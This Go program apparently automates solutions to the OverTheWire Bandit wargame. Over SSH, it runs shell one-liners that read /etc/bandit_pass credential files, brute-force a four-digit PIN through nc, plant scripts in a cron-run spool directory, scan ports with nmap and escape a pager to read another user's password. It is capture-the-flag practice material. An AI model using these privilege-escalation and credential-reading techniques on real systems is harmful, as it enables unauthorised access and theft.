package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/MJKWoolnough/memio"
)

const (
	host     = "bandit.labs.overthewire.org:2220"
	username = "bandit%d"
)

var commands = [...]string{
	//level 0
	"echo -n \"Password:\";cat readme",
	//level 1
	"echo -n \"Password:\";cat ./-",
	//level 2
	"echo -n \"Password:\";cat \"spaces in this filename\"",
	//level 3
	"echo -n \"Password:\";cat inhere/.hidden",
	//level 4
	"echo -n \"Password:\";find inhere -type f | while read file; do file \"$file\" | grep \"ASCII text\" > /dev/null && cat \"$file\" && break;done",
	//level 5
	"echo -n \"Password:\";find inhere -type f -size 1033c ! -executable  | while read file; do file \"$file\" | grep \"ASCII text\" > /dev/null && cat \"$file\" && break;done | tr -d ' '",
	//level 6
	"echo -n \"Password:\";find / -type f -group bandit6 -user bandit7 -size 33c 2>/dev/null | while read file; do file \"$file\" | grep \"ASCII text\" > /dev/null && cat \"$file\" && break;done | tr -d ' '",
	//level 7
	"echo -n \"Password:\";grep millionth data.txt | sed -e 's/^millionth[ 	]*//'",
	//level 8
	"echo -n \"Password:\";sort data.txt | uniq -u",
	//level 9
	"echo -n \"Password:\";strings ./data.txt | grep \"==\" | cut -d' ' -f2 | tail -n1",
	//level 10
	"echo -n \"Password:\";base64 -d data.txt | sed -e 's/.* //'",
	//level 11
	"echo -n \"Password:\";cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' | sed -e 's/.* //'",
	//level 12
	"echo -n \"Password:\";" +
		"tmpDir=\"$(mktemp -d)\";" +
		"cd \"$tmpDir\";" +
		"xxd -r ~/data.txt ./data.bin;" +
		"while true; do" +
		"       case \"$(file -b --mime-type data.bin)\" in" +
		"       \"application/gzip\")" +
		"               mv data.bin data.bin.gz;" +
		"               gzip -d data.bin.gz;;" +
		"       \"application/x-bzip2\")" +
		"               mv data.bin data.bin.bz2;" +
		"               bzip2 -d data.bin.bz2;;" +
		"       \"application/x-tar\")" +
		"               mv data.bin data.bin.tar;" +
		"               filename=\"$(tar -tf data.bin.tar)\";" +
		"               tar -xf data.bin.tar;" +
		"               mv \"$filename\" data.bin;;" +
		"       *)" +
		"               sed -e 's/.* //' data.bin;" +
		"               break;;" +
		"       esac;" +
		"done;" +
		"cd;" +
		"rm -rf \"$tmpDir\";",
	//level 13
	"echo -n \"Password:\";ssh -o StrictHostKeyChecking=no -i sshkey.private bandit14@127.0.0.1 cat /etc/bandit_pass/bandit14 2> /dev/null",
	//level 14
	"echo -n \"Password:\";echo %q | nc 127.0.0.1 30000 | grep -v \"Correct\" | tr -d '\\r\\n';echo",
	//level 15
	"echo -n \"Password:\";echo %q | openssl s_client -ign_eof -connect 127.0.0.1:30001 2> /dev/null | grep -A1 \"Correct\" | grep -v \"Correct\" | tr -d '\\r\\n';echo",
	//level 16
	"echo -n \"Password:\";" +
		"tmpFile=\"$(mktemp)\";" +
		"nmap -p 31000-32000 127.0.0.1 | grep \"/tcp\" | sed -e 's@^\\([0-9]*\\)/.*@\\1@' | while read port; do" +
		"       (echo %q;sleep 2s) | openssl s_client -connect 127.0.0.1:\"$port\";" +
		"done 2> /dev/null | grep -A 27 Correct | grep -v Correct > \"$tmpFile\";" +
		"chmod 600 \"$tmpFile\";" +
		"ssh -o StrictHostKeyChecking=no -i \"$tmpFile\" bandit17@127.0.0.1 cat /etc/bandit_pass/bandit17 2> /dev/null;" +
		"rm -f \"$tmpFile\";",
	//level 17
	"echo -n \"Password:\";diff passwords.old passwords.new | tail -n1 | cut -d' ' -f2",
	//level 18
	"echo -n \"Password:\";cat readme",
	//level 19
	"echo -n \"Password:\";./bandit20-do cat /etc/bandit_pass/bandit20",
	//level 20
	"echo -n \"Password:\";(echo %q | nc -l 127.0.0.1 8080) & sleep 1s;./suconnect 8080 &> /dev/null",
	//level 21
	"echo -n \"Password:\";cat \"$(grep chmod \"$(grep -v reboot /etc/cron.d/cronjob_bandit22 | cut -d' ' -f7)\" | cut -d' ' -f3)\"",
	//level 22
	"echo -n \"Password:\";cat /tmp/\"$(bash -c \"myname=bandit23;$(cat \"$(grep -v reboot /etc/cron.d/cronjob_bandit23 | cut -d' ' -f7)\" | grep mytarget=);echo \\$mytarget\")\"",
	//level 23
	"echo -n \"Password:\";" +
		"tmpFile=\"$(mktemp)\";" +
		"chmod 666 \"$tmpFile\";" +
		"xFile=\"$(mktemp -p /var/spool/bandit24/)\";" +
		"echo \"cat /etc/bandit_pass/bandit24 > $tmpFile\" > \"$xFile\";" +
		"chmod 777 \"$xFile\";" +
		"until [ -s \"$tmpFile\" ]; do" +
		"	sleep 1s;" +
		"done;" +
		"cat \"$tmpFile\";" +
		"rm -f \"tmpFile\";",
	//level 24
	"echo -n \"Password:\";" +
		"for i in {0000..9999};do" +
		"	echo %q\" $i\";" +
		"	sleep 0.01s;" +
		"done | nc 127.0.0.1 30002 | grep \"The password of user bandit25 is\" | cut -d' ' -f7",
	//level 25 below
}

func RunCommands(server, username, password, commands string, stdout, stderr io.Writer) error {
	s, err := ssh.Dial("tcp", server, &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return err
	}
	session, err := s.NewSession()
	if err != nil {
		return err
	}

	session.Stdout = stdout
	session.Stderr = stderr

	err = session.Run(commands)
	session.Close()
	if err != nil {
		return err
	}
	return s.Close()
}

func main() {
	var (
		level    uint
		password string
	)

	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "bandit0", "password for initial level")
	flag.Parse()

	stdout := make(memio.Buffer, 0, 41)

	for n, cmds := range commands[level:] {
		n += int(level)
		log.Printf("Level %2d: Sending Commands...\n", n)

		if strings.Contains(cmds, "%q") {
			cmds = fmt.Sprintf(cmds, password)
		}

		err := RunCommands(host, fmt.Sprintf(username, n), password, cmds, &stdout, os.Stderr)
		if err != nil {
			log.Printf("Level %2d: error: %s\n", n, err)
			break
		}
		if string(stdout[:9]) != "Password:" || len(stdout) != 42 || stdout[41] != 10 {
			log.Printf("Level %2d: invalid password: %s\n", n, stdout[9:])
			return
		}
		password = string(stdout[9:41])
		log.Printf("Level %2d: Password: %s\n", n, password)
		stdout = stdout[:0]
	}
	//level 25
	log.Printf("Level 25: Sending Commands...\n")
	s, err := ssh.Dial("tcp", host, &ssh.ClientConfig{
		User:            "bandit25",
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		log.Printf("Level 25: error: %s\n", err)
		return
	}
	session, err := s.NewSession()
	if err != nil {
		log.Printf("Level 25: error: %s\n", err)
		return
	}
	if err = session.RequestPty("vt100", 2, 40, ssh.TerminalModes{
		ssh.ECHO:          0,
		ssh.TTY_OP_ISPEED: 14400,
		ssh.TTY_OP_OSPEED: 14400,
	}); err != nil {
		log.Printf("Level 25: error: %s\n", err)
		return
	}
	wc, _ := session.StdinPipe()
	r, _ := session.StdoutPipe()
	session.Shell()

	pw := make(chan string)

	go func() {
		buf := bufio.NewReader(r)
		i := 0
		for {
			b, err := buf.ReadBytes('\n')
			if err == io.EOF {
				break
			} else if err != nil {
				log.Printf("Level 25: error: %s\n", err)
				close(pw)
				return
			}
			if bytes.Contains(b, []byte("/etc/bandit_pass/bandit26")) {
				index := bytes.Index(b, []byte("[1;1H"))
				pw <- string(b[index+5 : index+37])
				close(pw)
				return
			}
			i++
		}
	}()

	for _, cmd := range [...]string{
		"ssh -o StrictHostKeyChecking=no -i bandit26.sshkey bandit26@localhost;exit\n",
		"v",
		":e /etc/bandit_pass/bandit26\n",
		":q\n",
		"q",
	} {
		wc.Write([]byte(cmd))
		time.Sleep(time.Second)
	}

	log.Printf("Level 25: Password: %s\n", <-pw)
	wc.Close()
	session.Close()
	s.Close()
}
